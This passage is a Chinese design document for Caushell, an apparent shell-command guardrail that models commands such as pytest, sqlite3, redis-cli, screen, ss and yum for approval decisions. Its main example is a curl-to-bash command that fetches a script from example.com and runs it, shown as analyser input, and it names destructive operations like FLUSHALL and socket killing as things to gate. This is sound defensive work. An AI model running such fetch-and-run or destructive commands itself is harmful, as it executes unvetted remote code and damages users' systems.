# 语义模型：AST、命令建模与会话执行图

Caushell 将 shell action 中的命令和语义关系加入可查询的会话执行图。这个过程分为语法解析、命令建模和会话图扩展，依次建立语法结构、命令行为和会话关系。

## Shell AST

![Shell action 到 Shell AST](../assets/caushell-ast.png)

图中的 action 是：

```bash
SCRIPT=./setup.sh
curl -fsSL https://example.com/install.sh \
  | tee "$SCRIPT" >/dev/null \
  && bash "$SCRIPT"
```

解析器将原始文本转换为 Shell AST，并保留后续建模需要的语法结构：

| Shell 结构 | AST 中的结构 | 后续用途 |
| --- | --- | --- |
| `SCRIPT=./setup.sh` | assignment | 建立变量绑定 |
| `curl ... \| tee ...` | pipeline | 表示标准输出到标准输入的连接 |
| `&&` | and-list | 表示后一个命令依赖前一个命令成功 |
| `curl`、`tee`、`bash` | command | 定位需要建模的命令调用 |
| `"$SCRIPT"` | variable reference | 解析变量引用 |
| `>/dev/null` | redirect | 记录重定向及其目标 |

Shell AST 是语法阶段的产出。命令行为、路径解析结果和来源关系在后续阶段建立。

完整的 Bash 双引号字符串以外层引号之间的原始文本作为 token 文本，保留换行、空白、转义、变量展开的写法、原始 source span 以及独立采集的命令替换事实。解析器不求值，也不通过拼接 AST 子节点重建文本；操作数的值由既有 argv 解码与值物化层确定。不完整的引号仍标记为部分解析。

递归解析内联脚本前，先将外层 Shell 操作数物化成完整的 argv 值：字面参数复用已有的引号感知词法解码器，绑定变量沿用既有精确标量解析。已解码字面值、已解析标量和运行时 argv 数据不再次展开，原始引号元数据及 span 仍保留。静态前缀、不支持的展开和不完整值保持未知，沿用既有审批兜底。规范内联 Shell 分派与嵌套 payload 记录复用这条物化路径；来自 stdin、文件或配置的完整程序正文不重复进行外层引号解码。

## 命令建模

![Shell AST 到会话执行图](../assets/caushell-graph.png)

命令建模使用 AST 和运行时上下文，为每个命令调用补充可查询的行为语义：

| 输入 | 提供的信息 |
| --- | --- |
| Shell AST | 命令、参数、管道、重定向和控制连接 |
| Command Profiles | 命令形式、参数作用、输入输出、执行效果和子命令分派方式 |
| 运行时 shell 状态 | cwd、变量、别名、函数、位置参数及其可见性 |
| 已提交的会话事实 | 同一会话中已经建立的状态和来源关系 |

Command Profiles 描述不同命令支持的调用形式和行为。Caushell 根据与当前调用匹配的 Profile，判断各参数表示路径、网络地址还是待执行内容，并确定命令如何读取、写入或执行这些内容。

在图示 action 中：

| 命令 | 建模结果 |
| --- | --- |
| `curl` | 从网络地址读取内容并写入标准输出 |
| `tee` | 从标准输入读取内容并写入目标路径 |
| `bash` | 将目标路径作为 shell 脚本执行 |

`SCRIPT=./setup.sh` 建立变量绑定。解析变量引用后，两个命令调用可以表示为：

```bash
tee ./setup.sh
bash ./setup.sh
```

因此，`tee` 写入的目标和 `bash` 执行的脚本都指向 `./setup.sh`。这个相对路径会在会话图扩展阶段结合当前目录继续解析。

### 参数值投影

当操作数除了路径还包含其他信息时，路径参数可以声明 `value_projection`。绑定结果仍保留完整参数、源码位置、绑定来源和物化来源信息，路径分析使用单独的语义视图；命令分派和实际 argv 不会因此被改写。

```yaml
- name: test_paths
  semantic: {kind: path, role: read, purpose: generic_operand}
  binding: {kind: remaining_positionals}
  cardinality: optional_many
  value_projection:
    kind: prefix_before
    delimiter: "::"
    if_absent: original

- name: cache_path
  semantic: {kind: path, role: write, purpose: generic_operand}
  binding: {kind: following_flag, flag: "--override", operand_mode: next_arg}
  cardinality: optional_many
  value_projection:
    kind: key_value
    separator: "="
    key: cache_dir
```

`prefix_before` 提取第一个分隔符前面的文本：`tests/test_api.py::test_login` 在路径分析中表示 `tests/test_api.py`。没有分隔符时，`if_absent: original`（默认值）保留整个操作数，`if_absent: unknown` 则保留未知。`key_value` 完整匹配第一个分隔符前面的键：`cache_dir=/etc/pytest-cache` 提供路径 `/etc/pytest-cache`，`console_output_style=classic` 不提供缓存路径；值中后续的 `=` 不会被截掉。

未知与不适用严格区分。投影后为空、格式不完整、值无法解析、或来自隐式运行时操作数时，都保留未知；已确认不匹配的键不生成路径，也不触发“目标未解析”的修改兜底。未引用的动态展开可能产生更多 argv，所以固定前缀不足以证明路径完整或参数不适用。对于完整双引号包裹的参数，已经完成的静态分隔符可以确定路径前缀或不匹配的键，即使后缀仍未知。已物化的精确值和解码后的字面数据不会二次展开；整个操作数的运行时路径域不会直接继承给其子串。

路径事实、文件内容来源关系、修改目标、派生路径及灾难性目标判断使用同一语义视图。投影根目录未知时，派生效果仍保留未知，不会消失。审批或拒绝由已有护栏决定，不新增风险 pass 或命令名特例。多个绑定操作数分别投影，不擅自采用某个命令的重复选项优先级规则。

此声明目前只用于 `cwd_anchor` 以外的文件系统 `path` 语义，不用于命令引用或 payload。不声明时沿用已有视图，不分配投影值。投影本身不会激活 Profile 或发现配置；内置 pytest Profile 将它与下面的配置路径声明结合使用。

### 结构化参数与编码 argv

`structured_projection` 为 plain-value 或 `script_file_ref` payload 参数声明工具自己的小语法：可选的列表分隔符、按顺序匹配的 literal／prefix／keyword-value 分支，以及 fallback。prefix 匹配会消费前缀；没有 target 的分支表示已确认无相关效果。脚本引用可以保留执行边界，同时投影出单独的路径视图，不必重复绑定同一个 argv。各 target 声明不同的虚拟 slot 和语义，原始 argv 不变，源码位置及物化来源仍保留。`sources` 按顺序选择首个存在的原始 slot；显式未知不会退回后面的默认值。分隔符、slot 引用与命名冲突在加载时验证。

```yaml
structured_projection:
  separator: ','
  branches:
    - matcher: {kind: literal, value: '-'}
    - matcher: {kind: prefix, value: '@'}
      target:
        name: child_commands
        semantic: {kind: command_ref, dispatch: wrapper_command}
  fallback:
    name: output_bases
    semantic: {kind: plain_value}
```

分派 target 可声明 `command_whitespace_argv: child_commands`，将每个语义值按空白拆成 executable／argv，而不是再解析为 Bash。程序名与参数都标为 argv 数据；字面量 `$`、引号、管道和分号不会被二次解释。解析失败保留未解析子调用，未知写入目标也不会变成“没有修改”。原有标量 `value_projection` 不变；只有声明这种语法的参数才进行结构化解码。

普通分派同样通过 `BoundParameter.semantic_values()` 读取程序名、argv、环境赋值和移除项，原操作数、span 与绑定来源保持不变。已知投影值是 argv 数据，不是新的 Shell 源码。未知投影程序保留未解析记录；未知 argv 保留子调用候选和明确的分析缺口，不借用原操作数的路径范围。未知环境覆盖会使继承值和部分已知子环境失效，即使先声明清空环境也不能抹掉显式覆盖的未知性；父环境不受影响。绑定元数据时直接沿用已物化的完整 argv 结果，避免再次展开。未声明投影的操作数保持原有物化行为。

`stdin_from_parent: true` 表示父工具将生成的数据交给子调用 stdin。现有分派、执行上下文和流来源提取记录这条关系，内容保持不透明，并沿包装分派保留；`@bash` 因此需要审批。包装层内未解析的分派也保留到既有审批兜底，无需新增风险 pass 或 Harness 字段。

首个使用者为 `nsys stats/analyze --output`，区分控制台、文件 basename、默认 basename 和 `@command`。生成的报告用 `sibling_files` 表示为确定目录下的 `BoundedPathSet`，不虚构一个名为 basename 的实际文件；目录在拼接报告名之前归一化。读取 `.nsys-rep` 时的潜在 SQLite 创建及显式 `--sqlite` 目标独立保留；帮助不触发这些效果。

普通 `nsys profile` 采集声明应用／argv 分派、仅对子调用生效的逗号分隔环境覆盖及应用 stdout 来源。显式输出 basename 和默认 `report#` 表示为有效 cwd 下的有界 sibling 文件族，不虚构具体报告名。duration／capture-shutdown 声明可能的 `control_process` 效果，显式 `--kill=none` 仅关闭已建模的终止效果。基于 Graph 效果的进程控制护栏默认审批，可由规则配置改为 allow／deny；它不依赖可选的已知动作字段或已知 PID，没有动作映射时仍记录进程控制和未知目标。当前请求没有候选时，在查询 Graph 前直接跳过；该规则的 allow 配置不能覆盖其他修改或拒绝规则。

持久 `launch/start/stop/shutdown` 会话、回调／插件、command file、身份／环境设置模式及原生百分号报告模板仍不透明并要求审批。已列出的 stats/analyze 内置报告／规则及格式可静态接受；其他报告或格式、附加参数及自定义目录作为不透明代码引用送审。列表对齐和执行次数不作精确重演，所有输出项均保留为候选，可能增加审批。没有读取报告内容、动态探测进程或新增 Harness 字段。

依据：[NVIDIA stats CLI](https://docs.nvidia.com/nsight-systems/UserGuide/index.html#cli-stats-command-switch-options)、[profile CLI](https://docs.nvidia.com/nsight-systems/UserGuide/index.html#cli-profile-command-switch-options)。

### 不透明代码与选项内的 Shell 命令

`{kind: payload, language: opaque, source: inline_string, recursive: true}` 显式声明不属于已建模 Shell 语言的可执行代码。既有递归分析保留真实来源及“不支持此语言”证据，既有 ResolvePolicy Pass 默认对 `opaque_non_shell` 要求审批。脚本引用和隐式 stdin 使用同一语言声明及各自真实来源。本地或空 stdin 不能证明这个显式代码入口已被理解或安全：opaque 是语言语义未支持，不是可交给来源护栏兜底的运行时输入缺口。不引入 AWK/HCL 解释器、不猜内部路径、不动态读取代码，也不新增风险 Pass；现有 Python/Node 等静态字面量及运行时输入默认行为不变。本声明不声称覆盖配置、provider 或 backend 行为。

混合选项中的 Shell 命令先投影为 plain-value 虚拟 slot，再用既有 `command_string: {slot: proxy_command, syntax: posix_shell}` 分派：

```yaml
structured_projection:
  first_match_only: true
  branches:
    - matcher:
        kind: keyword_value
        keyword: ProxyCommand
        case_insensitive: true
        allow_quoted_keyword: true
        disabled_values: [none]
        unresolved_markers: ['%']
      target: {name: proxy_command, semantic: {kind: plain_value}}
```

关键字边界为 SP／TAB／CR／LF 或 `=`，只消费开头的分隔符，不改命令体内的引号和 Shell 语法。ASCII 大小写匹配同时用于关键字与禁用值。可选配置 token 引号支持由一个双引号片段结束关键字。`first_match_only` 遇到第一个匹配、禁用或未知值即停；已知不相关关键字不占用首值。默认 false，旧多值行为不变。声明的运行时标记、缺失或动态输入产生未知 slot，沿用未解析子调用审批，不伪造具体命令。只访问显式声明语法的参数；Proxy stdout 是 SSH 传输流，不推断为父命令 stdout。依据：[OpenSSH 关键字解析与优先级](https://github.com/openssh/openssh-portable/blob/master/readconf.c)、[配置 token 引号](https://github.com/openssh/openssh-portable/blob/master/misc.c)。

### 结构化补丁数据与修改目标

Form 可选择声明 `payload_projections`，解析完整的工具数据协议，而不是 Bash 或其他可执行语言；未声明的形式不扫描。首个格式为 `codex_apply_patch`，由 Profile 选择，不在共享绑定器中按命令名特判：

```yaml
payload_projections:
  - format: codex_apply_patch
    source: {kind: slot, name: patch}
    reads: patch_reads
    writes: patch_writes
    deletes: patch_deletes
    max_bytes: 1048576
    max_operations: 4096
effects:
  - {kind: read_path, target: {kind: slot, name: patch_reads}}
  - {kind: write_path, target: {kind: slot, name: patch_writes}}
  - {kind: delete_path, target: {kind: slot, name: patch_deletes}}
```

来源必须为未投影的 plain-value 参数；也可声明 `source: {kind: stdin}`，此时要求 plain `stdin_data` 输入。三个目标 slot 不得重名或与已有 slot 冲突，Form 必须声明相应效果。默认限制为 1 MiB 和 4096 个操作，均要求大于零。`no_arguments` 区分无参数与 flag／`--`，不同于只判断位置参数的 `no_positional_args`。

内置 `apply_patch`／`applypatch` Profile 接受一个完整补丁参数，或无参数时的有效 stdin。新增产生写入；更新产生读取和写入；删除产生删除；更新并移动产生源路径读取／删除和目标路径写入。批量操作保留所有目标。空补丁和已证明不存在的效果类别使用明确的空语义视图，不产生未知修改。审批或拒绝复用现有工作区修改及灾难性效果护栏，没有新增风险 Pass 或 Harness 请求字段。

解码器验证完整边界、操作头和更新块，不实际应用补丁，不把新增行或上下文行解释成命令。路径保留字面字节、空格及 Unicode，不二次展开文件名；外层 Shell 参数仍先进行已有物化。截断、非法、动态、超限或带环境选择标记的输入保留未知写入／删除，不把成功解析的前缀当成安全证明。纯解码与输入大小线性相关；原始来源按效果类别保存一次，不按每个文件复制整份补丁。

统一执行解析入口仅在既有静态证据证明完整 stdin 时提供内容：显式重定向覆盖管道，多个 stdin 重定向以最后一个为准。环境 stdin、未知文件内容、部分片段及父工具生成的不透明输出均保留未知，包装链不会把父工具原 stdin 当成其输出。没有探测宿主机文件或进程。补丁实际成功、最终文件精确内容和独立非 Shell 编辑工具不属于此范围；上游 Shell 参数物化的未支持形式继续保守送审。

协议依据：[固定 Codex apply-patch 解析器源码](https://github.com/openai/codex/tree/f6fd7f17ed2ef4bf28e5b320789d764350ce4529/codex-rs/apply-patch/src)。这是固定实现的契约，不宣称涵盖所有未来版本。

### 不透明参数文件与 Ruff 效果

Profile 可以声明完整 argv 的参数文件识别：

```yaml
argument_files:
  - prefix: '@'
    possible_effects: [read_path, write_path, delete_path]
```

在工具选项绑定之前，检查已物化的完整 argv，包括选项值和 `--` 后的参数。未知 argv 保留可能展开的解释。声明的文件效果具有未知目标，写入／删除交给既有修改护栏审批；不读取参数文件或探测文件系统。工具支持已有字面 `@path` 时，因此保守保留两种可能。未声明的 Profile 不扫描参数文件。载入时拒绝空前缀、空效果列表和非文件效果。

形式匹配失败时，部分绑定已保留的修改效果仍进入修改护栏。路径参数的基础角色不排他：读取参数上的写入效果也生成 Graph 的写入 PathFact。这是命令无关的事实保留修正，不新增策略或 pass。

Ruff Profile 覆盖直接 `check`、`format`、`clean` 和信息查询。普通 `check` 保留潜在源文件修改，因为未读取的配置可能启用 `fix` 或 `fix-only`；单独 `--no-fix` 不足以证明只读。`--diff`、检查信息模式，或不存在冲突修复／抑制开关的 `--no-fix --no-fix-only` 才取消源文件修改。`format --check/--diff` 同理。默认输入为 cwd。`--stdin-filename` 只是 stdin 身份，不是磁盘输出目标；check 的 watch／抑制模式仍保留文件处理效果。

Ruff 拒绝 `--diff` 与 `--add-noqa/--add-ignore` 同用；Profile 对冲突的修复／抑制组合保守保留源文件修改候选，不将其当作有效只读形式。检查信息模式在抑制处理之前返回。源文件只读不取消 check 的独立报告输出。显式缓存／报告目标采用配置路径；默认未知缓存沿用已选定的附带缓存豁免。清理缓存是未知删除，不享有隐含写入豁免。环境未知不等于变量不存在：shell-state 观察范围不足时，可能存在 `RUFF_OUTPUT_FILE` 并要求审批；显式 CLI 输出优先。

新增按声明启用的 `toml_string` 值投影，例如 `{kind: toml_string, key: cache-dir}`，提取顶层 TOML 字符串键。使用 TOML 解析器处理引号和转义，非法或动态值保留未知。Ruff `--config` 同时接受文件和 TOML，已存在文件优先；不探测存在性时，赋值形式的操作数提供潜在内联缓存目标，文件内容及其隐藏设置仍不读取。不按后缀猜类型。本轮不宣称覆盖 `analyze`、`server`、Python 模块入口和任意配置／代码行为。

依据：[Ruff 配置](https://docs.astral.sh/ruff/configuration/)、[设置](https://docs.astral.sh/ruff/settings/)、[固定 CLI 源码](https://github.com/astral-sh/ruff/tree/127e77ef8bee49f21c0e7c2ff1e38ccf27fb522a/crates/ruff/src)。

### SQLite CLI 与不透明执行输入

`sqlite3` Profile 表达数据库操作数、主文件及 `-journal`／`-wal`／`-shm` 的潜在写入、内联 SQL／点命令、stdin、`-cmd`、启动配置和 VFS 代码加载。`:memory:` 和省略数据库时的默认内存模式不生成文件路径；URI 数据库保持不透明，不伪造为 cwd 下的 `file:` 路径。不探测文件／脚本分派或数据库内容，首个操作数只是潜在数据库，并非已经确认的数据库文件；由脚本分派选中的后续目标保留未知。

`sqlite_cli` 是保留到 Graph、证据与 Query 的 payload 语言元数据，表示 SQL 加 SQLite 点命令，不是 Bash；它不启用 SQL 解释器，也不会从 `.shell` 文本伪造 Shell 子调用。内联输入忽略 stdin，stdin 形式保留可执行输入来源。`--noinit` 同时取消默认和显式 init 加载；否则保留明确的 init 路径，或将 XDG／home 默认启动位置保持未知。复合／未识别选项从完整未消费 argv 中保留为不透明客户端语法；像 flag 的值、完整选项名及 `--` 归属沿用共享绑定器。

所有 SQL／客户端执行均保留未知写入候选，由已有修改护栏要求审批，包括表面上的 `SELECT`、`--readonly`、`:memory:` 和 `--safe --noinit` 调用。这是明确的不透明执行边界，不是声称每条查询都会写入。readonly 保护普通主数据库，不能保证点命令／函数没有副作用；WAL 附属文件及自动检测的 ZIP 后端也不支持把整个调用断言为只读。未知客户端效果要求审批时，数据库及附属文件效果仍单独可见。

原生 safe 模式不获得工作区隔离豁免：启动脚本在其启用之前执行，`-cmd` 顺序及 nonce 可以绕过限制，即使 `--safe --noinit` 也允许指定工作区外的 `temp_store_directory`。没有通过 SQL 正文过滤假装完成分析。不带数据库、提前执行／取值选项或未识别选项的纯 `--noinit --help/--version` 是信息查询。本轮没有新增风险 Pass、命令名底层特例、动态探测、依赖或 Harness 请求字段。

依据：[SQLite CLI](https://sqlite.org/cli.html)、[固定 SQLite 3.53.4 CLI 源码](https://github.com/sqlite/sqlite/blob/b09c88c14082339b66c7b7158d609a771e64ca69/src/shell.c.in)。

### 数据库操作类别与 Redis CLI

Profile 可声明 `{kind: database_operation, database_operation: read|write|administration|opaque, target: {kind: none}}`。数据库 key 是普通值，不伪装成文件路径。操作类别保留到 `ExecutionSemantics.database_operations`、决策 trace、快照和既有执行语义 Query；读取旧数据时默认为空，空字段不输出，不要求 Harness 新增输入字段。

独立 `database_operation_guard` 消费当前请求已经解析的调用，包括明确声明的部分绑定。没有非只读数据库效果时，在收集规范来源节点之前返回；不遍历 session 历史，不探测服务器。Read 不产生决策；`database_state_mutation`、`database_administration`、`database_opaque_execution` 默认 NeedApproval，归属可配置的 `database_safety` family。单条规则配置优先于 family，文件修改等其他护栏仍独立生效。

`redis-cli` Profile 明确准入固定的查询集合，包括 `GET`、`EXISTS`、`DBSIZE` 和 `CONFIG GET`。`SET`、`DEL`、`GETDEL`、`FLUSHALL` 等数据修改以及 `CONFIG SET`、`SHUTDOWN` 等管理操作默认审批；localhost 或工作区内 Unix socket 不证明数据库归属。Lua、函数、交互／RESP 流、stdin 参数替换（`-x`／`-X`）、quoted-input 重解释和未知命令作为不透明操作审批，不当作 Bash 解析。`--rdb`／`--functions-rdb` 保留数据库读取和独立文件输出；`-` 表示 stdout，不是文件名，Shell 重定向仍独立检查修改目标。

前置选项在命令处停止：`redis-cli -a --help GET key` 的 `--help` 是密码值，`redis-cli GET --eval missing.lua` 中后两项是发送给服务器的数据。命令前的特殊模式不会被表面的 GET 遮蔽。信息查询不添加数据库操作；未知或缺少参数的选项保留本 Profile 明确声明的不透明 selection-failure 效果，不修改全局解析缺口策略。混合模式保守分类，不重放所有原生优先级；查询准入不证明自定义命令重命名、模块命令、数据机密性、隐式服务器状态或精确的服务器语法合法性。

依据：[Redis CLI](https://redis.io/docs/latest/develop/tools/cli/)、[固定 Redis 8.2.3 CLI 源码](https://github.com/redis/redis/blob/8.2.3/src/redis-cli.c)。

### 终端会话操作与 GNU Screen

Profile 可声明 `{kind: terminal_session_operation, terminal_session_operation: inspect|create|attach|control|opaque, target: {kind: none}}`。这是静态操作类别，不证明实际 session 存在或归属。每个调用内去重，保留到 `ExecutionSemantics.terminal_session_operations`、trace、快照和既有执行语义 Query；旧数据缺字段默认为空，空列表不输出。会话／窗口名称、控制协议文本均为普通值，不伪装成文件路径。

复用已有 `interactive_escape_guard` 的当前请求索引语义查询，不新增 Pass、历史遍历或运行时探测。Inspect 不添加 finding 或决策；Create、Attach、Control、Opaque 由新规则 `terminal_session_operation` 默认 NeedApproval，归属既有 `interactive_control` family，沿用单规则优先的配置机制。原 `interactive_escape_surface` 默认 Observe 不变，其他工具原策略不变。空操作列表不增加二次遍历或分配；这不是 latency 实测结果。

`screen` Profile 放行 `-v`、带零或一个尾部匹配模式的 `-ls`／`-list`，以及无额外参数、大小写精确的 `-Q windows|info|lastmsg|number|title`。其他查询语法、缺参数／未知选项、未声明的紧凑组合保留 Opaque；明确的 selection-failure 效果保证默认解析缺口 Observe 也不会绕过审批。列表与控制选项混用、匹配模式后追加选项保守审批，没有扩改可选操作数扫描器。查询准入是操作层策略，不证明整个原生程序零副作用：原生列表／查询路径也可能维护 socket 注册目录。

新建 session／窗口（含 STY 场景）、附着／接管、分离、`-wipe` 和 `-X` 控制／注入默认审批。子程序 argv、默认 shell、`stuff`、`eval`、`source`、`screen` 等 Screen 协议不当作 Bash 或子命令分派；潜在的新启动配置保留 LoadConfig 候选，不证明既存服务的配置或存活。日志模板、协议选择的输出保持不透明，不捏造精确文件写入。Shell 重定向仍独立检查；将终端规则改成 Observe 也不等于这些暂缓效果已完成精细分析。

普通新窗口消息可能携带调用方 cwd，但环境及远程控制上下文可能不同；不把调用方 ShellState 赋给已有窗口。不扫描 session，不新增动态进程事实、依赖或 Harness 字段。这是静态控制准入边界，不宣称完成 Screen 协议解释。

查询准入要求简单、固定的会话／窗口／列表操作数；动态引用、通配符、包含空白及重复 `-S`／`-p` 的形式保守归为不透明，不能据此证明运行时 argv 的数量。限制写在 Profile 中，未改共享选项扫描器。

依据：[GNU Screen 调用文档](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html)、[启动配置](https://www.gnu.org/software/screen/manual/html_node/Startup-Files.html)、[固定 Screen 5.0.1 源码](https://ftp.gnu.org/gnu/screen/screen-5.0.1.tar.gz)。

### Socket 查询与暂缓审查的连接关闭

Linux iproute2 的 `ss` Profile 将普通查询与 `-K/--kill` 的 `close_sockets_unchecked` 形式分开。当前关闭连接本身不触发审批，这是明确的产品风险范围选择，不是将其判成只读。没有新增 socket 控制效果、进程 kill 替代事实、风险 pass 或动态连接探测；Profile 保留独立 form 与风险范围说明，Graph 保留 form ID。通用短选项匹配器保留带参数选项之前的已声明无参数前缀，包括 `-KtF-` 紧凑写法和 `-4` 等数字选项；遇到参数边界就停止，不将参数文本扫描成后续选项。完整选项词模式和 `--` 的既有语义不变。

`-D/--diag` 的文件写入独立保留，包括关闭连接形式；工作区外或未知输出仍要求审批。`-F/--filter` 仅表示文件读取或普通 stdin 过滤数据，不当作 Bash 或嵌套命令。上游按操作数首字节判断：以 `-` 开头的诊断目标使用 stdout，过滤输入使用 stdin；`./-name` 仍是实际路径。沿用结构化投影保留原参数及未知路径候选；旧短选项匹配器未绑定的紧凑操作数使用下述可选前缀范围声明。未知过滤输入保留未知读取目标，不宣称已经确定实际使用文件还是 stdin。

Socket 匹配表达式、family／table、namespace 名称和 BPF map ID 都是普通值：匹配 UNIX socket 路径不等于文件修改，匹配远端地址不等于向它上传数据。`-p` 查看进程，`-E` 观察关闭事件，都不制造进程控制事实。帮助／版本查询抑制延后执行的诊断输出，但 Shell 组合中的写入和删除仍独立检查。重复诊断目标保守保留，不精确重放最后参数优先级；不覆盖 resolver 内部行为、过滤语法验证、选项缩写、构建特性和全部非法组合。

依据：[ss 手册](https://man7.org/linux/man-pages/man8/ss.8.html)、[固定上游源码](https://github.com/iproute2/iproute2/blob/e11870d5b9414b2e0770463bd6fc2399744dc734/misc/ss.c)。

### 配置路径与附带缓存写入

当路径来自多个选项或配置覆盖项时，效果可以声明 `configured_path`。来源按声明顺序检查，采用第一个适用来源；同一来源中采用最后一个适用的 argv 值。显式未知值不会退回低优先级来源或隐含默认值。完整操作数、绑定归属及物化元数据仍保留。

```yaml
kind: write_path
target:
  kind: configured_path
  sources:
    - slot: overrides
      projection: {kind: key_value, separator: "=", key: cache_dir}
  relative_to:
    slot: rootdir
    expand_environment: true
    fallback_parent_slot: config_file
  expand_environment: true
  expand_user: true
  missing: incidental_cache
  purpose: incidental_cache
```

绝对目标不依赖锚点；相对目标使用声明的锚点，主锚点缺席时可使用备用配置文件操作数的父目录。主锚点未知不等于缺席，不能退回备用值。没有声明锚点时相对路径使用 cwd；要求锚点但无法确定时保留未知。工具自身的环境变量展开需要显式声明，未解析的环境引用保留未知，不读取护栏进程的环境；家目录展开使用请求提供的 home，不查询其他用户。

`missing: skip` 表示没有适用来源就不生成目标；`missing: unknown` 保留未知目标，交给既有护栏判断。`missing: incidental_cache` 在 Graph 中保留未知缓存写入事实，但现有工作区外修改护栏不为这项隐含写入请求审批。Profile 载入时限定该声明只能用于 `write_path` 且用途为 `incidental_cache`。一旦选中了显式来源，即使值为空或未知，也不能获得豁免；仅标记缓存用途不足以跳过检查。`default_value` 可提供 `pytestdebug.log` 等固定字面默认值，但不能与未知兜底同时声明。来源及锚点引用的 slot 必须已声明。

直接调用 pytest/py.test 的 Profile 覆盖测试选择器、配置及插件加载边界、缓存覆盖和清理、JUnit 报告、日志文件以及显式临时目录清理。内置 CLI 行为依据 [pytest 9.0.2 缓存源码](https://github.com/pytest-dev/pytest/blob/9.0.2/src/_pytest/cacheprovider.py)、[根目录选择](https://github.com/pytest-dev/pytest/blob/9.0.2/src/_pytest/config/findpaths.py)、[JUnit 输出](https://github.com/pytest-dev/pytest/blob/9.0.2/src/_pytest/junitxml.py)、[日志](https://github.com/pytest-dev/pytest/blob/9.0.2/src/_pytest/logging.py)及[临时目录处理](https://github.com/pytest-dev/pytest/blob/9.0.2/src/_pytest/tmpdir.py)。缓存路径相对 rootdir，而初始 CLI/ini 日志输出和 JUnit 报告相对 cwd；重复覆盖采用最后一个匹配键，CLI 日志路径优先于 ini 覆盖。

cwd 与工作区均为 `/workspace` 时，默认 `pytest tests/` 放行隐含未知缓存写入。显式 `-o cache_dir=/etc/cache`、显式未知输出、目标未知的 `--cache-clear`，以及工作区外的报告、日志和 basetemp 目标仍需要审批。显式目标落在工作区且必要锚点已确定时允许。shell 重定向、删除和其他命令独立检查，不新增 pass 或 pytest 命令名分支。

本轮不解释配置内容、环境注入的附加选项、测试／插件 Python 代码，也不探测运行时文件系统。未读取的配置可能将隐含缓存重定向到工作区外；放行这项未知附带写入是已选定的策略取舍，不是认定其目标在工作区内。配置或 Python 代码隐藏的非缓存写入不属于这些 CLI 声明声称覆盖的范围。Python `-m pytest` 分派仍是独立待办。

### Conda 环境目标

直接 Conda Profile 建模环境创建、包安装／更新／删除、对应的 `env` 操作、查询及显式导出。事务通过 `configured_path` 声明可能的写入与删除，采用最后一个显式 `-p/--prefix` 值。环境名、当前激活环境以及未读取定义／配置文件里的目标，不足以确定文件系统路径：保留未知目标，由既有工作区外修改护栏要求审批。已确定的 prefix 正常判断工作区范围。不增加动态探测、Harness 字段或 Conda 专用风险 pass。前缀选项依据 [Conda 26.7.0 CLI helpers](https://github.com/conda/conda/blob/26.7.0/conda/cli/helpers.py) 核查。

标准事务预演不声明环境修改或安装包逻辑执行，但 shell 重定向和相邻命令独立检查。install/update 的 download-only 不将包链接进环境；create 则仍声明可能删除 prefix，因为它可能在事务处理前移除已有环境，见[创建流程](https://github.com/conda/conda/blob/26.7.0/conda/cli/main_create.py)和[事务处理](https://github.com/conda/conda/blob/26.7.0/conda/cli/install.py)。定义文件是输入，不是环境修改目标。查询和 stdout 导出不虚构环境写入；`export -f` 提供独立输出路径，工具层不额外展开家目录或环境变量，见[导出实现](https://github.com/conda/conda/blob/26.7.0/conda/cli/main_export.py)。

该范围是 CLI 事务目标，不等于完整 Conda 执行建模。配置内容、求解结果、传递依赖、缓存／注册表路径、插件及链接／激活脚本均不解释。`run/activate/deactivate`、`config/clean/init/rename`、环境变量配置和 Python 模块分派另行处理。尤其 [Conda run](https://github.com/conda/conda/blob/26.7.0/conda/cli/main_run.py) 先激活环境再执行子命令，未将它声明为透明包装器。

### 可选声明：操作语义未解析

Profile 可声明 `opaque_on_unresolved: true`，缺省为 `false`。形式选择失败／歧义、
未知子命令、绑定残留、未消费参数、只识别一部分的短选项组合、缺失选项值，
都会保留 `operation_semantics_unresolved` 事实。选项值及声明的选项边界之后的数据
不会重新当作选项。已识别的效果与参数不被删除，路径和包来源仍独立检查。

现有 `ResolvePolicyPass` 对 `opaque_invocation` 类别默认要求审批；Profile 只声明未知，
不决定策略动作。可通过 `policy.resolve_gaps.opaque_invocation` 配置
`allow/need_approval/deny`，其中 allow 只观察此未知事实，不停用其他护栏。
事实进入 Graph、快照、决策 Trace 和执行语义 Query；旧记录缺少字段时读为 false，
false 不写入 JSON。未启用的 Profile 保留原来的选择／绑定策略。
没有新增 Pass 或命令名特例；全参数核对只在启用该声明的 Profile 上运行。

### Yum：包来源与安装目录分别判断

Yum Profile 独立声明 `manager: yum`，不复用 Apt 身份，也不将 `dnf/dnf5` 注册为别名。
依据固定[官方源码](https://github.com/rpm-software-management/yum/tree/4ed25525ee4781907bd204018c27f44948ed83fe)，
CLI 选项可在命令前后出现。安装、更新、重新安装、同步和卸载记录安装目录的 `write_path`，
默认 `/`，显式 `--installroot` 取最后一个值；未知、空值和非绝对路径不退回默认值。
这里表示目录级修改（卸载也会修改 RPM 数据库），不是声称删除安装根目录或枚举包内所有文件。
工作区外目标由既有修改护栏审批；工作区内目标仍独立检查执行的包来源。

查询不声明安装事务，配置决定的隐含缓存写入沿用既有 incidental-cache 策略。
`--downloaddir` 是显式输出：仓库 setup 会创建它，即使当前命令是查询，见
[仓库 setup](https://github.com/rpm-software-management/yum/blob/4ed25525ee4781907bd204018c27f44948ed83fe/yum/repos.py#L152)
和[目录 setter](https://github.com/rpm-software-management/yum/blob/4ed25525ee4781907bd204018c27f44948ed83fe/yum/yumRepo.py#L777)。
该输出正常检查工作区范围，不享受隐含缓存豁免。`--downloadonly` 保留来源与输出但不声明
安装包逻辑执行；`--cacheonly/--assumeno/--nodeps` 不被推断成无事务预演。
`clean` 的真实缓存目标未静态确定时，保留未知删除目标并要求审批，不将删除豁免成缓存写入。

普通 install 的 `.rpm` 操作数只有在运行时文件存在或为远程 URL 时才走本地安装，见
[原生分支](https://github.com/rpm-software-management/yum/blob/4ed25525ee4781907bd204018c27f44948ed83fe/cli.py#L1013)。
因此可能的本地／仓库歧义保留 `unknown_dynamic`，不是恢复“猜后缀就是文件”的分类。
`localinstall/localupdate` 由明确参数角色声明本地来源，URL 仍单独分类。
同步的 `full/different` 操作模式不是包来源。更新整个环境和传递依赖不虚构具体包节点。

显式配置文件、任意 `--setopt`、插件选择、未知子命令、group 事务、history 重放、
`yum shell/load-transaction` 通过 `opaque_on_unresolved` 声明走既有 resolve-gap 审批，
不把 Yum 命令语言解析为 Bash。
没有新增 Pass、动态探测、请求字段或命令名特例。配置内容、RPM 宏、包脚本／触发器、
